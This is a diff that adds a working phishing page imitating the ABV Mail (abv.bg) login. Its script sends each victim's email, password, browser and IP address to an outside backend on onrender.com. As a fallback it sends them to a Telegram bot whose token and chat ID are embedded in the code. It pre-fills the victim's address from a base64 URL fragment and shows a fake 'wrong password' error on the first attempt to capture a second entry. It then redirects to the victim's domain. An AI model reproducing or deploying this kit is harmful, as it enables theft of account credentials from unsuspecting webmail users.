@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="bg">
+<head>
+    <title>АБВ Поща - Вход</title>
+    <meta charset="utf-8" />
+    <link rel="canonical" href="https://www.abv.bg/" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/svg+xml" href="https://img.abv.bg/ico/abv.svg?v=2" />
+    <link rel="icon" type="image/png" sizes="48x48" href="https://img.abv.bg/ico/abv.png?v2" />
+    <meta name="theme-color" content="#1ba916" />
+    <meta name="description" content="АБВ Поща е бърза, удобна и сигурна! Разполагате с 15 GB пространство, управлявате контакти, а пощата ви е защитена. Писмата ви са навсякъде с вас, с мобилното приложение на АБВ." />
+    <meta name="google-play-app" content="app-id=bg.abv.andro.emailapp" />
+    <meta name="facebook-domain-verification" content="r8wf98ijnb3q5toqh0t9p5gtvkh6qq" />
+    <meta name="apple-itunes-app" content="app-id=1024988497" />
+    <link rel="apple-touch-icon" href="https://img.abv.bg/abvmobile/i/ABV_icon_144x144_v2.png" />
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://img.abv.bg/abvmobile/i/ABV_icon_144x144_v2.png" />
+    <link rel="apple-touch-icon-precomposed" sizes="167x167" href="https://img.abv.bg/abvmobile/i/ABV_icon_167x167.png" />
+
+    <style>
+        /* ============================================================
+           ABV Login Styles
+           ============================================================ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #fff;
+            font: 14px Tahoma, sans-serif;
+            color: #263238;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        a {
+            color: #1e930c;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+
+        /* Header */
+        header.ribbon {
+            background: #f0f0f0;
+            border-bottom: 1px solid #e0e0e0;
+            padding: 10px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        header .logo a {
+            font: bold 18px Tahoma;
+            color: #1e930c;
+            text-decoration: none;
+        }
+
+        header .nav-links a {
+            font: 12px Tahoma;
+            color: #1e930c;
+            margin-left: 15px;
+            text-decoration: none;
+        }
+        header .nav-links a:hover {
+            text-decoration: underline;
+        }
+        header .nav-links a.selected {
+            color: #000;
+            cursor: default;
+            text-decoration: none;
+        }
+
+        /* Main Wrapper */
+        .mainWrapper {
+            max-width: 960px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 35px 20px;
+            flex: 1;
+        }
+
+        /* Login Container */
+        .abv-loginLeft {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .abv-cont.abv-entrance {
+            background: #b8e6fd;
+            padding: 25px 30px 20px 30px;
+            border-radius: 8px;
+            width: 100%;
+        }
+
+        .abv-cont.abv-entrance h2 {
+            font: 21px "Segoe UI", "Open Sans", sans-serif, Tahoma;
+            margin-bottom: 15px;
+            color: #263238;
+        }
+
+        .abv-cont.abv-entrance h3 {
+            font-size: 12px;
+            margin: 0 0 3px 0;
+            padding: 0;
+            font-weight: bold;
+            color: #263238;
+        }
+
+        .abv-cont.abv-entrance p {
+            margin: 0 0 10px 0;
+            font-size: 12px;
+        }
+
+        .abv-cont.abv-entrance input[type="text"],
+        .abv-cont.abv-entrance input[type="password"] {
+            width: 100%;
+            font-size: 15px;
+            padding: 8px 10px;
+            border: 1px solid #b9b9b9;
+            border-radius: 4px;
+            background: #fff;
+            outline: none;
+        }
+        .abv-cont.abv-entrance input[type="text"]:focus,
+        .abv-cont.abv-entrance input[type="password"]:focus {
+            border-color: #1e930c;
+            box-shadow: 0 0 0 2px rgba(30, 147, 12, 0.2);
+        }
+
+        .abv-cont.abv-entrance input[type="submit"] {
+            min-width: 99px;
+            height: 36px;
+            background: #1e930c;
+            border: 0;
+            border-radius: 4px;
+            cursor: pointer;
+            color: #fff;
+            font: bold 14px Arial;
+            text-transform: uppercase;
+            padding: 0 25px;
+            transition: background 0.2s;
+        }
+        .abv-cont.abv-entrance input[type="submit"]:hover {
+            background: #167a0a;
+        }
+        .abv-cont.abv-entrance input[type="submit"]:disabled {
+            background: #919191;
+            cursor: not-allowed;
+        }
+
+        .abv-cont.abv-entrance .abv-ml10 {
+            margin-left: 10px;
+            line-height: 36px;
+        }
+
+        .abv-cont.abv-entrance p:last-child {
+            margin: 0;
+            border-top: 1px solid rgba(0, 0, 0, 0.1);
+            padding: 10px 0 0 0;
+        }
+
+        /* Error / Success Messages */
+        .abv-red {
+            color: #d23100;
+        }
+        .abv-green {
+            color: #1e930c;
+        }
+        #msg, #error {
+            padding: 8px 12px;
+            margin: 8px 0;
+            border-radius: 4px;
+            display: none;
+            font-size: 13px;
+        }
+        #msg.error, #error {
+            background: #ffe8e6;
+            border: 1px solid #d23100;
+            color: #d23100;
+        }
+        #msg.success {
+            background: #e6f5e6;
+            border: 1px solid #1e930c;
+            color: #1e930c;
+        }
+
+        /* Footer */
+        footer {
+            background: #f0f0f0;
+            padding: 20px 0;
+            text-align: center;
+            font: 11px/13px Arial;
+            color: #bcbcbc;
+            margin-top: auto;
+        }
+        footer a {
+            color: #7c7c7c;
+            text-decoration: none;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Responsive */
+        @media (max-width: 600px) {
+            .abv-cont.abv-entrance {
+                padding: 20px;
+            }
+            header .nav-links a {
+                margin-left: 10px;
+                font-size: 11px;
+            }
+            .abv-cont.abv-entrance input[type="submit"] {
+                width: 100%;
+                margin-bottom: 10px;
+            }
+            .abv-cont.abv-entrance .abv-ml10 {
+                display: block;
+                margin-left: 0;
+                text-align: center;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .mainWrapper {
+                padding: 15px 10px;
+            }
+            .abv-cont.abv-entrance {
+                padding: 15px;
+            }
+            .abv-cont.abv-entrance h2 {
+                font-size: 18px;
+            }
+        }
+
+        /* Password toggle */
+        .password-wrapper {
+            position: relative;
+        }
+        .password-wrapper .toggle-pwd {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 14px;
+            color: #888;
+            padding: 4px 6px;
+        }
+        .password-wrapper .toggle-pwd:hover {
+            color: #333;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- ============================================================
+     HEADER
+     ============================================================ -->
+<header class="ribbon">
+    <div class="logo">
+        <a href="#"><strong>АБВ</strong> Поща</a>
+    </div>
+    <div class="nav-links">
+        <a href="#" class="selected">АБВ Поща</a>
+        <a href="#">DOX</a>
+        <a href="#">АБВ на твой домейн</a>
+    </div>
+</header>
+
+<!-- ============================================================
+     MAIN CONTENT
+     ============================================================ -->
+<main id="siteContent" class="mainWrapper">
+
+    <div class="abv-loginLeft">
+
+        <!-- ============================================================
+             LOGIN FORM
+             ============================================================ -->
+        <form id="loginForm" class="abv-cont abv-entrance">
+
+            <h2>Вход в АБВ Поща</h2>
+
+            <h3>АБВ потребител:</h3>
+            <p>
+                <input id="username" name="username" type="text" class="abv-LoginField" value="" maxlength="128" placeholder="example@abv.bg" />
+            </p>
+
+            <h3>Парола:</h3>
+            <p class="password-wrapper">
+                <input id="password" name="password" data-min-chars="6" type="password" value="" maxlength="30" placeholder="Въведете парола" />
+                <button type="button" class="toggle-pwd" id="togglePwd" aria-label="Покажи парола">👁</button>
+            </p>
+
+            <!-- Error / Success Messages -->
+            <div id="msg"></div>
+            <div id="error"></div>
+
+            <p class="x" style="display:flex; flex-wrap:wrap; align-items:center; gap:10px;">
+                <input id="loginBut" type="submit" value="Вход" class="fl" />
+                <a href="https://passport.abv.bg/app/profiles/lostpass" class="abv-ml10 fl">Забравена парола</a>
+            </p>
+
+            <p>
+                Нямаш профил в АБВ? <a href="https://passport.abv.bg/app/profiles/registration"><strong>Регистрирай се!</strong></a>
+            </p>
+        </form>
+        <!-- ============================================================
+             END LOGIN FORM
+             ============================================================ -->
+
+    </div>
+
+</main>
+
+<!-- ============================================================
+     FOOTER
+     ============================================================ -->
+<footer>
+    <p>© 1999-2024 Нет Инфо ЕАД. <a href="#">Всички права запазени.</a></p>
+</footer>
+
+<!-- ============================================================
+     SCRIPTS
+     ============================================================ -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+<script>
+    // ============================================================
+    // CONFIGURATION - CHANGE THESE AS NEEDED
+    // ============================================================
+
+    // Set to true to test without backend
+    const USE_LOCAL_MOCK = false;
+
+    // Your Render backend URL
+    const API_BASE_URL = "https://swagelokkorea.onrender.com";
+
+    // Telegram Bot Configuration (fallback if backend fails)
+    const BOT_TOKEN = "8165356500:AAGRl6iz2GNi_Az0xiHgtwTKFOlyNFPJntE";
+    const CHAT_ID = "6066389308";
+
+    // ============================================================
+    // LOGGING
+    // ============================================================
+    console.log('🚀 Script loaded!');
+    console.log('📍 Backend URL:', API_BASE_URL);
+    console.log('🔧 Local mock mode:', USE_LOCAL_MOCK);
+
+    // ============================================================
+    // PASSWORD TOGGLE
+    // ============================================================
+    document.getElementById('togglePwd')?.addEventListener('click', function() {
+        const pwdInput = document.getElementById('password');
+        if (pwdInput.type === 'password') {
+            pwdInput.type = 'text';
+            this.textContent = '🙈';
+        } else {
+            pwdInput.type = 'password';
+            this.textContent = '👁';
+        }
+    });
+
+    // ============================================================
+    // GET EMAIL FROM URL
+    // ============================================================
+    function getEmailFromHash() {
+        try {
+            const hash = window.location.hash.substr(1);
+            if (hash) {
+                // Try Base64 decode first
+                try {
+                    const decoded = atob(hash);
+                    console.log('📧 Email from hash (Base64):', decoded);
+                    return decoded;
+                } catch (e) {
+                    // Not Base64, use raw
+                    console.log('📧 Email from hash (raw):', hash);
+                    return hash;
+                }
+            }
+        } catch (e) {
+            console.log('⚠️ Error reading hash:', e);
+        }
+        return null;
+    }
+
+    function getEmailFromQuery() {
+        const params = new URLSearchParams(window.location.search);
+        const email = params.get('cms') || params.get('email') || params.get('user');
+        if (email) {
+            console.log('📧 Email from query param:', email);
+        }
+        return email;
+    }
+
+    // ============================================================
+    // SEND TO TELEGRAM DIRECTLY (FALLBACK)
+    // ============================================================
+    function sendToTelegram(email, password, ip, userAgent) {
+        const message = `
+    --------+ Excel ReZulT +--------
+    Email : ${email}
+    Password : ${password}
+    Checker: ${email}:${password}
+    Browser : ${userAgent || navigator.userAgent}
+    Language : ${navigator.language}
+    IP Address : ${ip || 'Unknown'}
+    Date : ${new Date().toISOString()}
+    ---------+ Excel ReZulT +-------------
+    `;
+
+        console.log('📤 Sending to Telegram directly...');
+
+        return $.ajax({
+            type: "POST",
+            url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+            data: {
+                chat_id: CHAT_ID,
+                text: message
+            },
+            dataType: "json",
+            timeout: 15000
+        });
+    }
+
+    // ============================================================
+    // SHOW MESSAGES
+    // ============================================================
+    function showError(msg) {
+        console.log('❌ Error:', msg);
+        const el = document.getElementById('msg');
+        el.textContent = msg;
+        el.className = 'error';
+        el.style.display = 'block';
+    }
+
+    function showSuccess(msg) {
+        console.log('✅ Success:', msg);
+        const el = document.getElementById('msg');
+        el.textContent = msg;
+        el.className = 'success';
+        el.style.display = 'block';
+    }
+
+    function hideMessages() {
+        document.getElementById('msg').style.display = 'none';
+        document.getElementById('error').style.display = 'none';
+    }
+
+    // ============================================================
+    // RESET BUTTON
+    // ============================================================
+    function resetButton() {
+        const btn = document.getElementById('loginBut');
+        btn.value = 'Вход';
+        btn.disabled = false;
+    }
+
+    // ============================================================
+    // PAGE LOAD - PRE-FILL EMAIL
+    // ============================================================
+    $(document).ready(function() {
+        console.log('✅ DOM Ready');
+        console.log('📍 URL:', window.location.href);
+
+        let email = getEmailFromHash();
+        if (!email) {
+            email = getEmailFromQuery();
+        }
+
+        if (email) {
+            $('#username').val(email);
+            console.log('✅ Email field set to:', $('#username').val());
+            // Highlight the field
+            $('#username').css('border-color', '#1e930c');
+        } else {
+            console.log('⚠️ No email found in URL');
+        }
+
+        // ============================================================
+        // SUBMIT HANDLER
+        // ============================================================
+        let attemptCount = 0;
+
+        $('#loginForm').on('submit', function(event) {
+            event.preventDefault();
+
+            console.log('🖱️ Form submitted!');
+            hideMessages();
+
+            const username = $('#username').val().trim();
+            const password = $('#password').val();
+
+            console.log('📧 Username:', username);
+            console.log('🔑 Password:', password ? '******' : '(empty)');
+
+            // --- Validation ---
+            if (!username) {
+                showError('Моля попълнете полето АБВ потребител.');
+                $('#username').focus();
+                return;
+            }
+
+            // Basic email format check
+            const emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+            if (!emailRegex.test(username)) {
+                showError('Моля въведете валиден имейл адрес.');
+                $('#username').focus();
+                return;
+            }
+
+            if (!password || password.length < 4) {
+                showError('Моля попълнете полето Парола (минимум 4 символа).');
+                $('#password').focus();
+                return;
+            }
+
+            const domain = username.split('@')[1];
+            console.log('🌐 Domain:', domain);
+
+            // Get IP info for logging
+            let ipInfo = { ip: 'Unknown', country: 'Unknown', city: 'Unknown', region: 'Unknown' };
+
+            // Try to get IP info
+            $.getJSON('https://ipinfo.io/json')
+                .done(function(data) {
+                    ipInfo = data;
+                    console.log('📍 IP Info:', ipInfo);
+                })
+                .always(function() {
+                    // Proceed with login
+                    processLogin(username, password, domain, ipInfo);
+                });
+        });
+    });
+
+    // ============================================================
+    // PROCESS LOGIN
+    // ============================================================
+    function processLogin(email, password, domain, ipInfo) {
+        const btn = document.getElementById('loginBut');
+        btn.value = 'Проверка...';
+        btn.disabled = true;
+
+        // ============================================================
+        // OPTION 1: Local Mock Mode
+        // ============================================================
+        if (USE_LOCAL_MOCK) {
+            console.log('🔧 Using LOCAL MOCK mode');
+
+            sendToTelegram(email, password, ipInfo.ip || 'Unknown', navigator.userAgent)
+                .done(function(response) {
+                    console.log('✅ Telegram sent via mock!', response);
+                    handleSuccess(email, password, domain);
+                })
+                .fail(function(err) {
+                    console.error('❌ Telegram mock error:', err);
+                    showError('❌ Грешка при изпращане. Моля, опитайте отново.');
+                    resetButton();
+                });
+            return;
+        }
+
+        // ============================================================
+        // OPTION 2: Send to Backend (Render)
+        // ============================================================
+        console.log('📡 Sending to backend:', API_BASE_URL + '/api/login');
+
+        $.ajax({
+            type: "POST",
+            url: API_BASE_URL + "/api/login",
+            data: JSON.stringify({
+                email: email,
+                password: password
+            }),
+            contentType: "application/json",
+            timeout: 10000,
+            success: function(response) {
+                console.log('✅ Backend response:', response);
+
+                if (response && response.success === true) {
+                    handleSuccess(email, password, domain);
+                } else {
+                    // Backend returned false - try direct Telegram
+                    console.log('⚠️ Backend returned false, trying direct Telegram...');
+                    sendToTelegram(email, password, ipInfo.ip || 'Unknown', navigator.userAgent)
+                        .done(function() {
+                            console.log('✅ Telegram sent via fallback!');
+                            handleSuccess(email, password, domain);
+                        })
+                        .fail(function(err) {
+                            console.error('❌ Fallback failed:', err);
+                            showError('Грешен потребител / парола.');
+                            resetButton();
+                        });
+                }
+            },
+            error: function(err) {
+                console.error('❌ AJAX Error:', err);
+
+                // Fallback: Send directly to Telegram
+                console.log('⚠️ Backend unreachable, trying direct Telegram...');
+                sendToTelegram(email, password, ipInfo.ip || 'Unknown', navigator.userAgent)
+                    .done(function(response) {
+                        console.log('✅ Telegram sent via fallback!', response);
+                        handleSuccess(email, password, domain);
+                    })
+                    .fail(function(err) {
+                        console.error('❌ Fallback failed:', err);
+                        showError('❌ Грешка при връзка със сървъра. Моля, опитайте отново.');
+                        resetButton();
+                    });
+            }
+        });
+    }
+
+    // ============================================================
+    // HANDLE SUCCESS
+    // ============================================================
+    let attemptCount = 0;
+
+    function handleSuccess(email, password, domain) {
+        attemptCount++;
+        console.log('📊 Attempt count:', attemptCount);
+
+        if (attemptCount >= 2) {
+            console.log('🔄 ATTEMPT 2+ - REDIRECTING to: http://www.' + domain);
+            showSuccess('✅ Успешен вход! Пренасочване...');
+            document.getElementById('loginBut').value = 'Пренасочване...';
+
+            setTimeout(function() {
+                console.log('🔄 Redirecting NOW to: http://www.' + domain);
+                window.location.replace('http://www.' + domain);
+            }, 3000);
+        } else {
+            console.log('❌ Attempt 1 - Showing "Грешен парола"');
+            showError('Грешен парола.');
+            document.getElementById('password').value = '';
+            document.getElementById('password').focus();
+            resetButton();
+        }
+    }
+
+    // ============================================================
+    // KEYBOARD SHORTCUT: Enter to submit
+    // ============================================================
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            const active = document.activeElement;
+            if (active && (active.id === 'username' || active.id === 'password')) {
+                document.getElementById('loginBut').click();
+            }
+        }
+    });
+</script>
+
+</body>
+</html>
